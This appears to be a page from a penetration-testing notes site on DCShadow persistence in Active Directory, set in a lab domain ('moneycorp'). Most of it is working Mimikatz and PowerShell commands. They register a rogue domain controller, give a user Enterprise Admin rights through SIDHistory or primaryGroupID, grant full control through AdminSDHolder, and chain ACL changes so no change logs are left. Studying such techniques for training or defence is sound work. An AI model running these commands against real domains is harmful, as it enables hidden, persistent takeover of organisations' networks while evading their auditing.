---
title: "DC Shadow"
description: "Persistence using DC Shadow."
lead: "Using DC Shadow for persistence in Active Directory with PowerView and Mimikatz."
date: 2021-11-06T11:53:35+01:00
lastmod: 2021-11-06T11:53:35+01:00
draft: false
images: []
menu: 
  active_directory:
    parent: "domain_persistence"
weight: 60
toc: true
---

## General

- Temporarily register a new domain controller in the target domain
- Use it to "push" attributes like SIDHistory or SPN on the target object
- Does not leave any change logs for the modified object
- New DC is registered my modifying the Configuration container, SPNs of an existing computer object and some RPC services
- Since attributes are changed from a DC, there are no change logs on the actual DC for the target object
- Requires DA privileges by default
- Attacker machine must be part of root domain of the forest

## Exploitation

- Requires two mimikatz sessions
- One with SYSTEM privileges to start RPC servers and specifiy attributes we want to modify

```powershell
!+
!processtoken
lsadump::dcshadow /object:root572user /attribute:Description /value="Hello from DCShadow"
```

- Another with enough privileges (DA or required permissions) to push the values

```powershell
lsadump::dcshadow /push
```

### Minimal Permissions

- DCShadow can be used with minimal permissions by modifying the ACLs of the
  - domain object
    - `DS-Install-Replica` (Add/Remove Replica in Domain)
    - `DS-Replication-Manage`-Topology (Manage Replication Topology)
    - `DS-Replication-Syncrhonize` (Replication Synchronization)
  - sites object (and its children) in the Configuration container
    - `CreateChild` and `DeleteChild`
  - object of the computer which is registered as a temporary DC
    - `WriteProperty` (Not Write)
  - target object
    - `WriteProperty` (Not Write)
- We can use `Set-DCShadowPermissions` from Nishang for setting the permissions
- Then, we don't need the second mimikatz instance running as a DA to push the changes

```powershell
# Use DCShadow as user student572 to modify root572user object from machine mcorp-student572
Set-DCShadowPermissions -FakeDC mcorp-student572 -SAMAccountName root572user -Username student572 -Verbose
```

### Interesting Attack Vectors

#### Set SIDHistory of a User Account to Enterprise Admins or Domain Admins Group

- User will not show up as EA/DA when running queries like `net group "Enterprise Admins" /domain`

```powershell
lsadump::dcshadow /object:student572 /attribute:SIDHistory /value:S-1-5-21-280534878-1496970234-700767426-519
```

#### Set primaryGroupID of a User Account to Enterprise Admins or Domain Admins

- Use will show up as a member of the target group when running queries like `net group "Enterprise Admins" /domain`

```powershell
lsadump::dcshadow /object:student572 /attribute:primaryGroupID /value:519
```

#### Modify ntSecurityDescriptor for AdminSDHolder to add Full Control for a User

```powershell
# Get the current ACL and copy it to clipboard
(New-Object System.DirectoryServices.DirectoryEntry(("LDAP://CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl | Set-Clipboard

# Append a FullControl ACE from above for SY/BA/DA
# Replace SY/BA/DA with our user's SID

# Get current user SID with PowerView
Get-DomainUser student572 | select objectsid

# Mimikatz command
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:$modifiedACEString
```

#### DCShadowception

- Run DCShadow from DCShadow
- Modifying permissions for objects so we dont need DA rights will also not leave any logs

```powershell
# Elevate to SYSTEM in mimikatz session
!+
!processtoken

# Get ACL for domain object
# ACEs to append:
# (OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)
# (OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)
# (OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)
(New-Object System.DirectoryServices.DirectoryEntry(("LDAP://DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl

# Mimikatz command
lsadump::dcshadow /stack /object:DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:$modifiedACEString

# Get ACL for computer object (attacker machine)
# ACE to append: (A;;WP;;;UserSID)
(New-Object System.DirectoryServices.DirectoryEntry(("LDAP://CN=mcorp-student572,CN=Computers,DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl

# Mimikatz command
lsadump::dcshadow /stack /object:mcorp-student572$ /attribute:ntSecurityDescriptor /value:$modifiedACEString

# Get ACL for target user
# ACE to append: (A;;WP;;;UserSID)
(New-Object System.DirectoryServices.DirectoryEntry(("LDAP://CN=student572,CN=Users,DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl

# Mimikatz command
lsadump::dcshadow /stack /object:student572 /attribute:ntSecurityDescriptor /value:$modifiedACEString

# Get ACL for Sites object in Configuration container
# ACE to append: (A;CI;CCDC;;;UserSID)
(New-Object System.DirectoryServices.DirectoryEntry(("LDAP://CN=Sites,CN=Configuration,DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl

# Mimikatz command
lsadump::dcshadow /stack /object:CN=Sites,CN=Configuration,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:$modifiedACEString

# Start RPC server
lsadump::dcshadow

# Push changes from other session
lsadump::dcshadow /push
```
